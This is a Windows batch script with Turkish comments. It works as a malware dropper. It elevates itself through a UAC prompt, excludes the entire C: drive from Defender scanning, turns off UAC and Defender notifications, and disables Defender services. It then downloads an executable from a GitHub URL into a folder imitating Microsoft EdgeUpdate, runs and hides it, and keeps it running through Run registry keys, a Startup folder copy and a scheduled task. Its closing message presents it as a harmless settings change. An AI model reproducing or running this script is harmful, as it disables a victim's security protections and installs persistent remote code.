@cls
@echo off
set "params=%*"
cd /d "%~dp0"

:: 1. Yönetici Yetkisi Kontrolü ve Alma
if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs"
fsutil dirty query %systemdrive% 1>nul 2>nul || (
    echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/c cd ""%~sdp0"" && %~s0 %params%", "", "runas", 0 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

:gotAdmin
pushd "%CD%"
CD /D "%~dp0"
set "jsbdsksbee=powershell"

:: 2. GENİŞ KAPSAMLI İSTİSNA EKLEME
:: Hem sistem klasörlerini hem de hedef çalışma klasörünü en başta güvenli yapar.
%jsbdsksbee% -w hidden -c "Add-MpPreference -ExclusionPath 'C:\', 'C:\Windows', 'C:\Program Files (x86)\Microsoft\EdgeUpdate'" >nul 2>&1


:: 3. .NET FRAMEWORK 3.5 KURULUMU (Eksikse)
dism /online /get-featureinfo /featurename:NetFx3 | findstr /I "Enabled" >nul 2>&1
if %errorlevel% neq 0 (
    dism /online /enable-feature /featurename:NetFx3 /all /norestart /quiet >nul 2>&1
)

:: 4. UAC (KULLANICI DENETİMİ) VE BİLDİRİM KİLİTLERİ
reg add "HKLM\SOFTWARE\Microsoft\Windows\Currentversion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\Currentversion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\Currentversion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableEnhancedNotifications" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Virus & threat protection" /v "UILockdown" /t REG_DWORD /d 1 /f >nul 2>&1

:: 5. DEFENDER POLİTİKALARI VE SERVİS ÖLDÜRME
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f >nul 2>&1
:: Tüm kritik güvenlik servislerini 'Devre Dışı' (4) moduna sokar
for %%s in (WdBoot,WdFilter,WdNisSvc,WinDefend,SecurityHealthService,Sense) do (
    reg add "HKLM\System\CurrentControlSet\Services\%%s" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1
)

:: 6. DİZİN HAZIRLAMA VE DOSYA İNDİRME
set "URL=https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/MicrosoftEdgeCoreUpdate.exe"
set "DEST_DIR=C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.217.3"
set "DEST=%DEST_DIR%\MicrosoftEdgeCoreUpdate.exe"

if not exist "%DEST_DIR%" mkdir "%DEST_DIR%" >nul 2>&1

:downLoop
if not exist "%DEST%" (
    %jsbdsksbee% -w hidden -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Start-BitsTransfer -Source %URL% -Destination '%DEST%'" >nul 2>&1
    if not exist "%DEST%" (
        %jsbdsksbee% -w hidden -c "(New-Object Net.WebClient).DownloadFile('%URL%', '%DEST%')" >nul 2>&1
    )
    timeout /t 5 /nobreak >nul
    goto downLoop
)

:: 7. ÇALIŞTIRMA VE GİZLEME
start /min "" "%DEST%"
timeout /t 2 /nobreak >nul
attrib +s +h "%DEST%" >nul 2>&1

:: 8. ÇOKLU KALICILIK (PERSISTENCE) YÖNTEMLERİ
:: A. Kayıt Defteri Başlangıç (HKCU & HKLM)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeUpdate" /t REG_SZ /d "\"%DEST%\"" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysWOW64" /d "\"%DEST%\"" /f >nul 2>&1

:: B. Başlangıç Klasörü Kopyası
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy /y "%DEST%" "%STARTUP_DIR%\MicrosoftEdgeCoreUpdate.exe" >nul 2>&1
attrib +s +h "%STARTUP_DIR%\MicrosoftEdgeCoreUpdate.exe" >nul 2>&1

:: C. Görev Zamanlayıcı (SySWOW)
set "TASK=SySWOW"
schtasks /delete /tn %TASK% /f >nul 2>&1
schtasks /create /tn %TASK% /tr "\"%DEST%\"" /sc onlogon /rl highest /f >nul 2>&1
schtasks /run /tn %TASK% >nul 2>&1

echo Islem tamamlandi. Ayarlarin tam aktif olmasi icin sistemi yeniden baslatin.
pause
exit